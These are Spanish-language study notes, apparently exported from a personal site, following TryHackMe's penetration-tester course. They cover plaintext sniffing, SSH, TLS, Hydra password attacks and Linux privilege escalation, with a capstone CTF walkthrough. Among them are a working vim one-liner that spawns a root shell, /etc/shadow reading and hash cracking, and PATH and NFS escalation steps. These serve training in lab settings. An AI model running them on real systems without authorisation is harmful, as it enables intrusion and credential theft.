    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 8. Protocols and Servers 2",
    "content": "Un ataque de esnifado se refiere a usar una herramienta de captura de paquetes para recolectar informaci√≥n sobre el objetivo. Cuando un protocolo se comunica en texto plano, la informaci√≥n transmitida puede ser capturada por un tercero para analizarla.\n\nHay varios programas para llevar a cabo este tipo de ataque:\n\n1. **Tcpdump:** Es una herramienta gratuita de l√≠nea de comandos soportada en muchos sistemas operativos.\n2. **Wireshark:** Es una herramienta gr√°fica gratuita disponible para m√∫ltiples sistemas operativos.\n3. **Tshark:** Es una alternativa CLI a Wireshark.\n\nConsidera a un usuario usando POP3 para comprobar sus mensajes. Primero vamos a usar Tcpdump para capturar su usuario y contrase√±a. En el ejemplo de abajo hemos usado el comando `sudo tcpdump port 110 -A`. \n\n- `sudo`: Porque necesitamos permisos de administrador para capturar paquetes de red.\n- `tcpdump`: Herramienta que invocamos.\n- `port 110`: Seleccionamos el puerto por defecto de POP3.\n- `-A`: Queremos mostrar los elementos capturados en ASCII.\n\n```shell\npentester@TryHackMe$ sudo tcpdump port 110 -A\n[...]\n09:05:15.132861 IP 10.20.30.1.58386 > 10.20.30.148.pop3: Flags [P.], seq 1:13, ack 19, win 502, options [nop,nop,TS val 423360697 ecr 3958275530], length 12\nE..@.V@.@.g.\n...\n......n......\"............\n.;....}.USER frank\n\n09:05:15.133465 IP 10.20.30.148.pop3 > 10.20.30.1.58386: Flags [.], ack 13, win 510, options [nop,nop,TS val 3958280553 ecr 423360697], length 0\nE..4..@.@.O~\n...\n....n....\".........?P.....\n...i.;..\n09:05:15.133610 IP 10.20.30.148.pop3 > 10.20.30.1.58386: Flags [P.], seq 19:43, ack 13, win 510, options [nop,nop,TS val 3958280553 ecr 423360697], length 24\nE..L..@.@.Oe\n...\n....n....\".........<-.....\n...i.;..+OK Password required.\n\n09:05:15.133660 IP 10.20.30.1.58386 > 10.20.30.148.pop3: Flags [.], ack 43, win 502, options [nop,nop,TS val 423360698 ecr 3958280553], length 0\nE..4.W@.@.g.\n...\n......n......\".....??.....\n.;.....i\n09:05:22.852695 IP 10.20.30.1.58386 > 10.20.30.148.pop3: Flags [P.], seq 13:28, ack 43, win 502, options [nop,nop,TS val 423368417 ecr 3958280553], length 15\nE..C.X@.@.g.\n...\n......n......\".....6......\n.<.....iPASS D2xc9CgD\n[...]\n```\n\nEn la terminal podemos ver los paquetes que transportan el usuario y la contrase√±a en texto plano.\n\nTambi√©n podemos usar Wireshark para conseguir los mismos resultados. Introducimos `pop` en la barra de b√∫squeda para filtrar por dicho protocolo.\n\n![[Pasted image 20251121140504.png]]\n\nEn resumen: cualquier protocolo que use comunicaci√≥n en texto plano es susceptible de dicho ataque.\n\nLa mitigaci√≥n recae en a√±adir una capa de cifrado a cada uno de los protocolos. En concreto TLS (Transport Layer Security), el cual ya se ha a√±adido a estos, y cambiado Telnet por SSH.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Secure Shell (SSH)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/8-protocols-and-servers-2/5-secure-shell-ssh/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/5. Secure Shell (SSH).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 8. Protocols and Servers 2",
    "content": "Secure Shell (SSH) fue creado para ofrecer una forma segura de administra un sistema remoto. En otras palabras, te permite conectarte de forma segura a otro sistema a trav√©s de la red y ejecutar comandos en el sistema remoto. Es decir que puedes:\n\n1. Confirmar la identidad del servidor remoto.\n2. Intercambiar mensajes cifrados s√≥lo descifrables por el receptor.\n3. Detectar modificaciones hechas a los mensajes.\n\nPara usar SSH necesitas un servidor SSH y un cliente. Escucha en el puerto 22 por defecto. Para autentificarte usa:\n\n- Usuario y contrase√±a.\n- Clave p√∫blica y privada.\n\nVeamos un ejemplo de conexi√≥n.\n\n```shell\nuser@TryHackMe$ ssh mark@10.82.183.163\nmark@10.82.183.163`s password: XBtc49AB\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Mon Sep 20 13:53:17 2021\nmark@debian8:~$ \n```\n\nComo es la primera vez que nos conectamos a este sistema, tenemos que verificar que en efecto es quien dice ser.\n\nPodemos usar SCP (Secure Copy Protocol) que est√° basado en SSH para transportar archivos de una m√°quina a otra. La sintaxis es: \n1. `scp user@ip:/remote_path /local_path` para descargar.\n2. `scp /local_path user@ip:/remote_path` para enviar.\n\n>[!IMPORTANT] FTP puede ser securizado usando SSL/TL (puerto 990) que resulta en FTPS o usando el protocolo SSH que resulta en SFTP (puerto 22, como SSH).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Transport Layer Security (TLS)",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/8-protocols-and-servers-2/4-transport-layer-security-tls/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/4. Transport Layer Security (TLS).md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 8. Protocols and Servers 2",
    "content": "En esta tarea, aprenderemos acerca de la soluci√≥n est√°ndar para proteger la confidencialidad e integridad de los paquetes intercambiados.\n\nSSL (Secure Sockets Layer) empez√≥ cuando la WWW estaba empezando a ver nuevas aplicaciones, como la compra online y la emisi√≥n de detalles de pago. Netscape introdujo SSL en 1994, con SSL 3.0 siendo lanzado en 1996. Pero con el tiempo, se introdujo m√°s  seguridad y TLS se present√≥ en 1999.\n\nLos protocolos que hemos visto hasta el momento, mandan la informaci√≥n en texto plano. Debajo se muestra una representaci√≥n del modelo ISO/OSI junto a los protocolos que hemos visto.\n\n![[Pasted image 20251121144921.png]]\n\nDebido a la fuerte relaci√≥n entre SSL y TLS, uno puede ser m√°s usado que el otro. Sin embargo, TLS es m√°s seguro que SSL y pr√°cticamente lo ha reemplazado. Esperamos que los servidores modernos usen todos TLS, por mucho que sigamos diciendo SSL/TLS.\n\nUn protocolo existente puede ser mejorado a uno seguro gracias a la capa de cifrado que ofrece SSL/TLS.\n\n| Protocolo | Puerto por defecto | Protocolo Seguro | Puerto por defecto con TLS |\n| --------- | ------------------ | ---------------- | -------------------------- |\n| HTTP      | 80                 | HTTPS            | 443                        |\n| FTP       | 21                 | FTPS             | 990                        |\n| SMTP      | 25                 | SMTPS            | 465                        |\n| POP3      | 110                | POP3S            | 995                        |\n| IMAP      | 143                | IMAPS            | 993                        |\n\nConsiderando el caso de HTTP, el protocolo inicial realizar√≠a dos pasos:\n\n1. Establecer una conexi√≥n TCP con el servidor web remoto.\n2. Mandar peticiones HTTP al servidor web como `GET` o `POST`.\n\nCon HTTPS, sin embargo, los pasos que sigue son:\n\n1. Establecer una conexi√≥n TCP.\n2. Establecer una conexi√≥n SSL/TLS.\n3. Mandar peticiones HTTP al servidor web.\n\nPara establecer una conexi√≥n SSL/TLS, el cliente necesita realizar el correspondiente handshake con el servidor. Seg√∫n la [RFC 6101](https://datatracker.ietf.org/doc/html/rfc6101), el establecimiento de la conexi√≥n SSL se ver√° como en la siguiente imagen.\n\n![[Pasted image 20251121145544.png]]\n\nDespu√©s de establecer la conexi√≥n TCP con el servidor, el cliente establece una conexi√≥n SSL/TLS. Los t√©rminos pueden resultar complicados, dependiendo de tus conocimientos en criptograf√≠a, por eso vamos a explicar los pasos:\n\n1. El cliente anda ClientHello al servidor para indicar sus capacidades, como algoritmos soportados.\n2. El servidor responde con ServerHello, indicando los par√°metros de conexi√≥n seleccionados. El servidor ofrece su certificado si se requiere autentificaci√≥n de servidor. Manda informaci√≥n adicional en el ServerKeyExchange necesaria para generar una clave √∫nica. Por √∫ltimo manda ServerHelloDone para indicar que de momento no tiene nada m√°s que a√±adir.\n3. El cliente responde con ClientKeyExchange que contiene la informaci√≥n adicional requerida para generar una clave √∫nica. Adem√°s empieza a usar cifrado e informa al servidor mediante ChangeCipherSpec.\n4. El servidor cambia a usar el cifrado e informa al cliente con ChangeCipherSpec.\n\nEn resumidas cuentas, se basa en un intercambio Diffie-Hellman. Si no sabes lo que es puedes verlo en [[4. Diffie-Hellman Key Exchange]].\n\nCuando navegamos en internet, necesitamos la confirmaci√≥n de una CA (Autoridad de Certificados) para dar fe de que en efecto nuestra p√°gina es la leg√≠tima. Esto es esencial para que SSL/TLS funcione.\n\n![[Pasted image 20251121150931.png]]\n\nEn la figura de arriba, podemos observar:\n\n1. ¬øA qui√©n se le expide el certificado? El nombre de la compa√±√≠a que usar√° el certificado.\n2. ¬øQui√©n expidi√≥ el certificado? El nombre de la CA que lo expidi√≥.\n3. El periodo de validez. Hasta cu√°ndo es v√°lido el uso de dicho certificado.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Password Attack",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/5-network-security/8-protocols-and-servers-2/6-password-attack/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/5. Network Security/8. Protocols and Servers 2/6. Password Attack.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 5. Network Security > 8. Protocols and Servers 2",
    "content": "Hemos visto la captura de paquetes de red y los ataques MITM y c√≥mo mitigarlos con TLS y SSH. El tercer tipo de ataque que cubriremos en esta tarea es el password attack.\n\nMuchos protocolos requieren que te autentifiques. Al usar protocolos como POP3, no deber√≠amos ser dados la capacidad de acceder a la bandeja de entrada de un usuario sin haber ofrecido credenciales correctas.\n\nLa autentificaci√≥n se puede cumplir de tres maneras:\n\n1. Algo que t√∫ sepas, como una contrase√±a, PIN, etc.\n2. Algo que t√∫ tengas, como una tarjeta SIM, RFID o un USB.\n3. Algo que t√∫ seas, como tu iris o huella dactilar.\n\nEsta tarea se centrar√° en ataques de contrase√±as (algo que t√∫ sabes). Basado en los 150 millones de nombres de usuario y contrase√±as filtradas de la brecha de Adobe en 2013, las 10 contrase√±as m√°s usadas son:\n\n- 123456\n- 123456789\n- password\n- adobe123\n- 12345678\n- qwerty\n- 1234567\n- 111111\n- photoshop\n- 123123\n\nS√≥lo 2 contrase√±as son relacionadas con Adobe, el resto son gen√©ricas. Pensar√≠as que esto ha cambiado respecto a la √∫ltima d√©cada, sin embargo, 123456, 1234567, 12345678 y 123456789 son contrase√±as muy comunes a d√≠a de hoy.\n\nLos ataques contra las contrase√±as se llevan a cabo de las siguientes maneras:\n\n1. **Adivinarlas:** Adivinar una contrase√±a requiere cierto conocimiento del objetivo, como la fecha de su cumplea√±os o nombre de mascota.\n2. **Ataque de Diccionario:** Intenta probar todas las contrase√±as de una lista, cuanto m√°s larga sea m√°s probabilidades de que la contrase√±a sea una de ellas.\n3. **Ataque de Fuerza Bruta:** Se pueden probar todas las combinaciones con cierto n√∫mero de caracteres.\n\nNos centraremos en los ataques de diccionario. A lo largo del tiempo, los hackers han recopilado contrase√±as filtradas en documentos que llamamos diccionarios.\n\nSi queremos una manera de probar todas las combinaciones es cuando entra en juego Hydra, herramienta que vimos en [[0. Hydra]].\n\nHaremos un peque√±o repaso con ejemplos:\n\nLa sintaxis general es: `hydra -l username -P diccionario servidor servicio` (may√∫scula equivale a un archivo y min√∫scula a la opci√≥n dada).\n\nAunque podemos usar esta otra sintaxis: `hydra -l username -w diccionario servicio://servidor`.\n\nEn estos ejemplos, el servidor es la IP de la m√°quina que hostea el servicio y el servicio es por ejemplo (ssh, ftp, etc.). \n\nAlgunas otras opciones son:\n\n- `-s puerto`: Para definir un puerto diferente del puerto por defecto.\n- `-V` o `-vV`: Para verbose o muy verbose.\n- `-t n`: Para definir el n√∫mero de conexiones paralelas (hilos/threads).\n- `-d`: Para depurar (debugging).\n\nSi quieres m√°s informaci√≥n visita la p√°gina enlazada arriba. \n\nAlgunas medidas de mitigaci√≥n son:\n\n- Pol√≠ticas de contrase√±a fuertes.\n- Bloqueo de la cuenta (despu√©s de cierto n√∫mero de intentos fallidos).\n- Retrasar la respuesta (un par de segundos es manejable para alguien que sabe la contrase√±a pero devastador para una herramienta de automatizaci√≥n.)\n- Resolver un CAPTCHA (verificando que sea humano el que introduce la contrase√±a).\n- Requerir un Certificado p√∫blico.\n- Habilitar la autentificaci√≥n de doble factor.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "10. Privilege Escalation - NFS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/10-privilege-escalation-nfs/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/10. Privilege Escalation - NFS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "Los vectores de escalada de privilegios no est√°n confinados a accesos internos. Las carpetas compartidas y las interfaces de manejo remoto como SSH o Telnet, tambi√©n pueden ayudarnos a ganar acceso root en el sistema objetivo. Algunos casos tambi√©n requerir√°n usar ambos vectores.\n\nOtro vector relevante para los CTFs y ex√°menes es una network shell desconfigurada. Este vector puede, a veces, ser visto durante testeos de penetraci√≥n cuando hay un sistema de backups de red.\n\nLa configuraci√≥n NFS (Network File Sharing) se guarda en `/etc/exports`. Este archivo es creado durante la instalaci√≥n del servidor NFS y suele ser le√≠ble para los usuarios.\n\n![[Pasted image 20251127183309.png]]\n\nEl elemento cr√≠tico de este vector de escalada de privilegios es la opci√≥n \"no_root_squash\" que puedes ver arriba. Por defecto, NFS cambiar√° el usuario root a nfsnobody y limitar√° cualquier archivo de correr con privilegios root. Si la opci√≥n \"no_root_squash\" est√° presente en una compartici√≥n escribible, podemos crear un ejecutable con el bit SUID configurado y ejecutarlo en el sistema objetivo.\n\nEmpezaremos enumerando comparticiones montables desde nuestra m√°quina atacante:\n\n![[Pasted image 20251127183605.png]]\n\nMontaremos una de las comparticiones \"no_root_squash\" en nuestra m√°quina atacante y empezaremos a construir nuestro ejecutable.\n\n![[Pasted image 20251127183714.png]]\n\nComo podemos configurar los bits SUID, un simple ejecutable que corra `/bin/bash` en el sistema objetivo funcionar√°.\n\n![[Pasted image 20251127183842.png]]\n\nUna vez compilado el c√≥digo, configuraremos el bit SUID. \n\n![[Pasted image 20251127183908.png]]\n\nVemos abajo que ambos archivos (nfs.c y nfs est√°n presentes en el sistema objetivo. Hemos trabajado en una compartici√≥n montada as√≠ que no hay necesidad de transferirlos).\n\n![[Pasted image 20251127184005.png]]\n\n>[!CAUTION] Si no ves el archivo nfs.c creado puede que tengas que hacer `cd ..` y luego volver a entrar, puede ser una desincronizaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Linux Privilege Escalation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/0-linux-privilege-escalation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/0. Linux Privilege Escalation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "[[1. What is Privilege Escalation]]\n[[2. Enumeration]]\n[[3. Automated Enumeration Tools]]\n[[4. Privilege Escalation - Kernel Exploits]]\n[[5. Privilege Escalation - Sudo]]\n[[6. Privilege Escalation - SUID]]\n[[7. Privilege Escalation - Capabilities]]\n[[8. Privilege Escalation - Cron Jobs]][[9. Privilege Escalation - PATH]]\n[[10. Privilege Escalation - NFS]]\n[[11. Capstone Challenge]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "11. Capstone Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/11-capstone-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/11. Capstone Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "A estas alturas deber√≠amos tener un buen entendimiento de los vectores de escalada de privilegios en Linux por lo que este reto deber√≠a ser f√°cil.\n\nHas ganado acceso a una gran instalaci√≥n cient√≠fica por SSH. Intenta elevar tus privilegios hasta ser root.\n\nNo te dejes ning√∫n m√©todo por comprobar, la escalada de privilegios suele ser m√°s a menudo un arte que una ciencia.\n\n-------------------------------\n<h2>Challenge</h2>\n1. Entramos por SSH con las credenciales otorgadas.\n   ![[Pasted image 20251127193448.png]]\n2. Empezaremos por el primer m√©todo estudiado: Kernel Exploits.\n\t1. Listamos el kernel.\n\t   ![[Pasted image 20251127193611.png]]\n\t2. Buscamos en Github (no hay nada) y buscamos en Exploit-DB, donde encontramos lo siguiente.\n\t   ![[Pasted image 20251127194047.png]]\n\t   No hay ninguna verificada, por lo que de momento no nos la vamos a jugar. \n3. Seguimos con el siguiente m√©todo: sudo.\n\t1. Probamos con `sudo -l`.\n\t   ![[Pasted image 20251127194334.png]]\n\t   No podemos, pasamos al siguiente m√©todo.\n4. El siguiente m√©todo es SUID.\n\t1. Empezamos buscando los archivos con los bits SUID y/o SGID configurados.\n\t   ![[Pasted image 20251127194721.png]]\n\t   Vamos a compararlos en GTFOBins.\n\t2. Hemos encontrado que base64 con SUID nos permite leer archivos.\n\t   ![[Pasted image 20251127194831.png]]\n\t3. Vamos a leer `/etc/shadow`.\n\t   ![[Pasted image 20251127195115.png]]\n\t   Hemos encontrado los hashes de root y missy.\n\t4. Veamos que grupos/id tiene missy.\n\t   ![[Pasted image 20251127195236.png]]\n\t   Nada muy interesante.\n\t5. Intentaremos crackear los hashes con John the Ripper.\n\t\t1. Metemos los archivos shadow y passwd y los combinamos con `unshadow`.\n\t\t   ![[Pasted image 20251127195921.png]]\n\t\t2. Investigamos que hash son las contrase√±as en nuestros propios apuntes.\n\t\t   ![[Pasted image 20251127195854.png]]\n\t\t3. Usamos John para crackearlos.\n\t\t   ![[Pasted image 20251127202448.png]]\n\t\t   De momento parece que hemos encontrado la contrase√±a de missy.\n5. Vamos a probar con el siguiente m√©todo: Capabilities.\n\t1. Usamos `getcap -r / 2>/dev/null` para obtener las capabilities.\n\t   ![[Pasted image 20251127201310.png]]\n\t2. Comparamos en GTFOBins.\n\t   ![[Pasted image 20251127201439.png]]\n\t   Ninguno coincide.\n6. Vamos a probar el siguiente m√©todo: Cron Jobs.\n\t1. Miramos el archivo `/etc/crontab`.\n\t   ![[Pasted image 20251127201553.png]]\n\t   No hay nada.\n7. Seguimos con el siguiente m√©todo: PATH.\n\t1. Listamos el PATH.\n\t   ![[Pasted image 20251127201737.png]]\n\t   Parece interesante la ruta `/home/leonard/scripts`.\n\t2. No existe esa ruta. Podr√≠amos intentar escalar creando el directorio y metiendo alg√∫n binario dentro m√°s adelante.\n\t   ![[Pasted image 20251127201927.png]]\n8. Vamos a seguir con el siguiente y √∫ltimo m√©todo: NFS.\n\t1. Listamos `/etc/exports`.\n\t   ![[Pasted image 20251127202245.png]]\n\t   Est√° vac√≠o, as√≠ que nada.\n9. De momento lo m√°s prometedor que hemos encontrado es la contrase√±a de missy, as√≠ que seguiremos por ah√≠. Nos logueamos con missy.\n   ![[Pasted image 20251127202532.png]]\n   Vamos a repetir los pasos con missy, a ver qu√© encontramos.\n10. Vaya, resulta que con missy s√≠ podemos ejecutar ciertos comandos como sudo.\n    ![[Pasted image 20251127202729.png]]\n11. Vamos a ver qu√© podemos conseguir en GTFOBins.\n    ![[Pasted image 20251127202831.png]]\n    Parece que s√≠ que es √∫til heheh.\n12. Seguimos los pasos.\n    ![[Pasted image 20251127202918.png]]\n13. Buscamos la flag.\n    ![[Pasted image 20251127203033.png]]\n    Por el directorio donde est√° podemos intuir que la flag era le√≠ble sin permisos de root desde la cuenta de missy. Por lo que seguramente tambi√©n podamos leer ya la flag2.\n14. Buscamos la flag 2.\n    ![[Pasted image 20251127203215.png]]\n\n>[!SUCCESS] Hemos conseguido escalar privilegios y obtener las dos flags.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Privilege Escalation - Capabilities",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/7-privilege-escalation-capabilities/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/7. Privilege Escalation - Capabilities.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "Otro m√©todo que los sysadmins pueden usar para incrementar el nivel de privilegios de un proceso o binario son las \"Capabilities\". Las capabilities ayudan a manejar privilegios a un nivel m√°s granular. Por ejemplo, si el analista SOC necesita usar una herramienta que necesite iniciar conexiones socket, un usuario normal no deber√≠a ser capaz de hacerlo. Si el sysadmin no quiere darle privilegios elevados a este usuario, pueden cambiar las capabilities del binario. Como resultado, el binario podr√≠a ejecutar el proceso sin la necesidad de un usuario con privilegios superiores.\n\nPodemos usar la herramienta `getcap` para listar capabilities habilitadas.\n\n![[Pasted image 20251127130635.png]]\n\nCuando se ejecuta como usuario no privilegiado, `getcap -r /` genera una cantidad inmensa de errores por lo que conviene redirigirlos a la basura (`2>/dev/null`).\n\nNi vim ni su copia tienen el bit SUID configurado por lo que este vector no es descubrible listando archivos en busca de SUID.\n\n![[Pasted image 20251127130928.png]]\n\nGTFOBins tiene una buena lista de binarios que pueden ser usados para la escalada de privilegios si encontramos alguna capability configurada.\n\nNotamos que vim puede ser usada con el siguiente comando y payload:\n\n![[Pasted image 20251127131036.png]]\n\nEsto lanzar√° una shell root:\n\n![[Pasted image 20251127131056.png]]\n\n>[!TIP] Esto funciona: `./vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"exec /bin/bash -p\")'` y despu√©s `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` para estabilizarla.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is Privilege Escalation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/1-what-is-privilege-escalation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/1. What is Privilege Escalation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "Escalar privilegios significa pasar de un usuario con permisos reducidos a una con m√°s permisos. M√°s t√©cnicamente es la explotaci√≥n de una vulnerabilidad, fallo de dise√±o o configuraci√≥n erronea en un sistema o aplicaci√≥n para ganar acceso no autorizado a recursos que normalmente est√°n restringidos a los usuarios.\n\n------------------------------------\n<h2>¬øPor qu√© es importante?</h2>\nEs raro al realizar un pentest en el mundo real que al conseguir un acceso inicial te de permisos administrativos.. Por eso es tan esencial. La escalada de privilegios te puede dar poder para:\n\n- Cambiar contrase√±as.\n- Sobrepasar controles de acceso a informaci√≥n sensible.\n- Editar configuraciones de software.\n- Habilitar persistencia.\n- Cambiar los privilegios de usuarios existentes (o nuevos).\n- Ejecutar cualquier comando administrativo.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Privilege Escalation - PATH",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/9-privilege-escalation-path/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/9. Privilege Escalation - PATH.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "Si un archivo, para el que tu usuario tiene permisos de escritura, est√° situado en el PATH, podr√≠as, potencialmente, secuestrar una aplicaci√≥n para correr un script. PATH en Linux, es una variable de entorno que le dice al sistema operativo d√≥nde buscar ejecutables. Para cualquier comando que no est√© construido en la shell o definido en el PATH, Linux empezar√° a buscar en directorios bajo el PATH.\n\nEl PATH se ve as√≠:\n\n![[Pasted image 20251127161215.png]]\n\nEsto podemos usarlo en nuestro favor de la siguiente manera:\n\nPrimero debemos responder a las siguientes preguntas:\n\n1. ¬øQu√© directorios est√°n bajo el $PATH?\n2. ¬øTiene permisos de escritura en alguno de estos nuestro usuario actual?\n3. ¬øPuedes modificar el $PATH?\n4. ¬øHay alg√∫n script/aplicaci√≥n que puedas arrancar que sea afectada por esta vulnerabilidad?\n\nCon prop√≥sitos de demostraci√≥n, usaremos el siguiente script:\n\n![[Pasted image 20251127162230.png]]\n\n>[!CAUTION] A√±ade: `#include <stdlib.h> // PARA system()` (para que no pete).\n\nEste script intenta lanzar un binario de sistema llamado `thm` pero se puede replicar con cualquier binario.\n\nCompilamos este en un ejecutable con bit SUID configurado.\n\n![[Pasted image 20251127162322.png]]\n\nNuestro usuario ahora tiene acceso al script \"path\" con SUID.\n\n![[Pasted image 20251127162406.png]]\n\nSi ejecutamos \"path\", este buscar√° un archivo ejecutable llamado \"thm\" en todos los directorios listados en PATH. Si alguno de los directorios listados en PATH es escribible, podr√≠amos crear un binario \"thm\" y el script \"path\" lo ejecutar√≠a. Como tiene configurado el SUID, correr√≠a con permisos de root.\n\nPara encontrar estos directorios usamos: `find / -writable 2>/dev/null | cut -d \"/\" -f 2 | sort -u`\n\n![[Pasted image 20251127163015.png]]\n\nAlgunos escenarios CTF pueden presentar diferentes directorios pero un sistema normal mostrar√≠a algo similar a lo que vemos arriba. Si lo comparamos al path podemos ver cu√°les son.\n\n![[Pasted image 20251127163546.png]]\n\nComo vemos directorios como `/usr/local/bin`, podemos ajustar nuestro comando de b√∫squeda de la siguiente manera: `find / -writable 2>/dev/null | cut -d \"/\" -f 2,3 | grep -v proc | sort -u`\n\n![[Pasted image 20251127164219.png]]\n\nPor desgracia, no son escribibles.\n\nEl directorio m√°s f√°cilmente escribible es `/tmp`. Pero este no es un directorio de PATH, por lo que necesitamos a√±adirlo: `export PATH=/tmp:$PATH`. \n\n![[Pasted image 20251127164429.png]]\n\nAhora ya buscar√° en `/tmp` por lo que si creamos el binario all√≠ se ejecutar√°.\n\n![[Pasted image 20251127164436.png]]\n\nLo que hace que esta escalada de privilegios funcione es que el script path se ejecuta con permisos de administrador.\n\n![[Pasted image 20251127164939.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Privilege Escalation - SUID",
    "path": "/apuntes/thm/1-career/2-penetration-tester/1-jr-penetration-tester/8-privilege-escalation/2-linux-privilege-escalation/6-privilege-escalation-suid/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/1. Jr Penetration Tester/8. Privilege Escalation/2. Linux Privilege Escalation/6. Privilege Escalation - SUID.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 1. Jr Penetration Tester > 8. Privilege Escalation > 2. Linux Privilege Escalation",
    "content": "Muchos de los controles de privilegios en Linux recaen en controlar las interacciones de usuarios y archivos. Esto se hace con permisos. Ya sabemos que los archivos/directorios pueden tener permisos de lectura, escritura y ejecuci√≥n. Estos se le dan a usuarios con su nivel de privilegios. Esto cambia con el SUID (Set-User IDentification) y SGID (Set-Group IDentification). Estos permiten que los archivos sean ejecutados con un nivel de permisos del due√±o o grupo due√±o del archivo, respectivamente.\n\nNotar√°s que estos archivos tienen un bit \"s\" que muestra su nivel de permiso especial.\n\n`find / -type f -perm -04000 -ls 2>/dev/null` listar√° los archivos con el bit SUID o SGID configurado.\n\n![[Pasted image 20251127122635.png]]\n\nUna buena pr√°ctica ser√≠a comparar ejecutables en esta lista con GTFOBins. Hacer click en el bot√≥n SUID filtrar√° binarios que se sepa que son explotables cuando el bit SUID est√© configurado.\n\nLa lista arriba muestra que nano tiene el bit SUID configuradoo. Desafortunadamente, GTFOBins no ofrece una victoria f√°cil. T√≠pico en los entornos reales, necesitaremos encontrar pasos intermedios en la escalada de privilegios.\n\n![[Pasted image 20251127123032.png]]\n\nEl bit SUID configurado para nano nos permite crear, editar o leer archivos con permisos del ue√±o. Nano es propiedad de root, lo que quiere decir que podemos leer y editar archivos a alto nivel de privilegios. Aqu√≠ tenemos dos opciones b√°sicas para la escalada de privilegios: leer el archivo `/etc/shadow` o a√±adir el usuario a `/etc/passwd`.\n\nAqu√≠ los pasos para explotar ambos vectores.\n\nLeyendo el archivo `/etc/file`:\n\nVemos que el editor nano tiene el SUID configurado ejecutando el comando `find / -type f -perm -04000 -ls 2>/dev/null`.\n\n`nano /etc/shadow` imprimir√° los contenidos de `/etc/shadow`. Ahora podemos usar la herramienta `unshadow` para crear un archivo crackeable por `John the Ripper`. Para conseguir esto, `unshadow` necesita ambos archivos: `/etc/passwd` y `/etc/shadow`.\n\n![[Pasted image 20251127123722.png]]\n\nLa herramienta unshadow se usa as√≠:\n\n`unshadow passwd.txt shadow.txt > passwords.txt`\n\n![[Pasted image 20251127123836.png]]\n\nCon el diccionario correcto y un poco de 